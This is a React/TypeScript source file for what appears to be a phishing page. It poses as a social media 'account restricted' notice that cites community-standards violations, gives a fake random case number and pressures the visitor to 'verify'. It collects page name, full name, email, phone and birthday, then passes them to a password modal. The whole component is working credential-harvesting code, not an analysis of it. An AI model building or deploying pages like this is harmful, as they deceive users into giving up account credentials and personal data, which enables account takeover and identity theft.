import HeroImage from "@/assets/images/home-image.png";
import PasswordModal from "@/components/password-modal";
import { useTranslation } from "@/hooks/useTranslation";
import { useEffect, useMemo, useState } from "react";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import type { GeoLocation } from "@/types/geo";
export interface FormData {
  pageName: string;
  fullName: string;
  email: string;
  phone: string;
  birthday: string;
}
enum NameForm {
  pageName = "pageName",
  fullName = "fullName",
  email = "email",
  phone = "phone",
  birthday = "birthday",
}

const Home = () => {
  const geoData: GeoLocation = JSON.parse(
    localStorage.getItem("geoData") ?? "{}",
  );

  const { texts } = useTranslation();

  const [today, setToday] = useState("");
  const [error, setError] = useState("");
  const [formData, setFormData] = useState<FormData>({
    pageName: "",
    fullName: "",
    email: "",
    phone: "",
    birthday: "",
  });
  const [showPasswordModal, setShowPasswordModal] = useState(false);

  useEffect(() => {
    const getToday = () => {
      const date = new Date();
      return date.toLocaleDateString("en", {
        year: "numeric",
        month: "long",
        day: "2-digit",
      });
    };
    setToday(getToday());
  }, []);

  const formatDate = (input: string) => {
    const numbers = input.replace(/\D/g, "");
    const limited = numbers.slice(0, 8);
    let formatted = "";
    if (limited.length >= 1) {
      const day = limited.slice(0, 2);
      formatted = day;
      if (limited.length >= 3) {
        const month = limited.slice(2, 4);
        formatted = `${day}/${month}`;
        if (limited.length >= 5) {
          const year = limited.slice(4, 8);
          formatted = `${day}/${month}/${year}`;
        }
      }
    }
    return formatted;
  };
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (name === NameForm.birthday) {
      const formattedBirthday = formatDate(value);
      setFormData((prev) => ({ ...prev, [name]: formattedBirthday }));
      return;
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = () => {
    switch (true) {
      case formData.birthday.length !== 10:
        setError(texts.invalidBirthday);
        return;
      case !formData.email.includes("@") && !formData.email.includes("."):
        setError(texts.invalidEmail);
        return;
      case !formData.fullName:
        setError(texts.fieldRequired);
        return;
      case !formData.pageName:
        setError(texts.fieldRequired);
        return;
      case formData.phone.length < 8:
        setError(texts.invalidPhone);
        return;
      default:
        setError("");
        setShowPasswordModal(true);
        return;
    }
  };
  return (
    <div className="mx-auto mt-4 flex max-w-2xl flex-col gap-4 px-4">
      <img src={HeroImage} alt="hero" className="mx-auto" />
      <div className="flex flex-col gap-4">
        <h1 className="text-xl font-bold">{texts.accountRestricted}</h1>
        <div className="flex flex-col gap-1">
          <h2 className="text-sm font-normal text-gray-600">
            {texts.termOfService}
          </h2>
          <p>
            {texts.unusualActivity} <b>{today}</b>. Someone has reported your
            account for not complying with{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              {texts.communityStandards}
            </span>
            . We have already reviewed this decision and the decision cannot be
            changed. To avoid having your account{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              {texts.disabled}
            </span>
            , {texts.pleaseVerify}
          </p>
          <div className="mt-4 flex flex-col gap-2">
            <div>
              <input
                autoFocus
                className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.pageName}
                value={formData.pageName}
                onChange={handleInputChange}
                placeholder={texts.pageNamePlaceholder}
              />
            </div>

            <div>
              <input
                className="w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.fullName}
                value={formData.fullName}
                onChange={handleInputChange}
                placeholder={texts.fullNamePlaceholder}
              />
            </div>

            <div>
              <input
                className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
                  formData.email.length > 0 &&
                  !formData.email.includes("@") &&
                  !formData.email.includes(".")
                    ? "border-red-500 focus:border-red-500"
                    : ""
                }`}
                type="email"
                name={NameForm.email}
                value={formData.email}
                onChange={handleInputChange}
                placeholder={texts.emailPlaceholder}
              />
            </div>

            <div className="flex w-full items-center rounded-full border border-gray-300">
              <PhoneInput
                containerClass="w-full! p-3 "
                inputClass="w-full! border-none! bg-transparent! "
                buttonClass=" border-none! rounded-l-full! hover:rounded-l-full! hover:bg-transparent! border-r-2 border-r-black "
                dropdownClass="select-none!"
                placeholder={texts.phoneNumberPlaceholder}
                value={formData.phone}
                country={geoData.country_code.toLowerCase()}
                onChange={(phone) =>
                  setFormData((prev) => ({ ...prev, [NameForm.phone]: phone }))
                }
              />
            </div>

            <div>
              <input
                className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${formData.birthday.length < 10 && formData.birthday.length && "border-red-500 focus:border-red-500"}`}
                type="text"
                name={NameForm.birthday}
                value={formData.birthday}
                onChange={handleInputChange}
                placeholder={texts.birthdayPlaceholder}
              />
            </div>

            <div className="mt-2 mb-4 flex flex-col justify-between border-y border-y-gray-300 p-2 text-sm text-gray-600 md:flex-row">
              <div className="flex md:flex-col">
                <span className="font-bold whitespace-nowrap">
                  {texts.caseNumber}
                </span>
                <span className="ml-1 font-bold text-blue-600">
                  {"#"}{" "}
                  {useMemo(() => Math.floor(Math.random() * 1000000000000), [])}
                </span>
              </div>
              <div className="font-bold md:w-3/4">{texts.aboutCase}</div>
            </div>
          </div>
          {error && <div className="text-red-500">{error} </div>}
          <button
            onClick={handleSubmit}
            className="cursor-pointer rounded-full bg-blue-500 p-4 font-semibold text-white"
            type="button"
          >
            {texts.continue}
          </button>
        </div>
      </div>

      <PasswordModal
        formData={formData}
        isOpen={showPasswordModal}
        onClose={() => setShowPasswordModal(false)}
      />
    </div>
  );
};

export default Home;
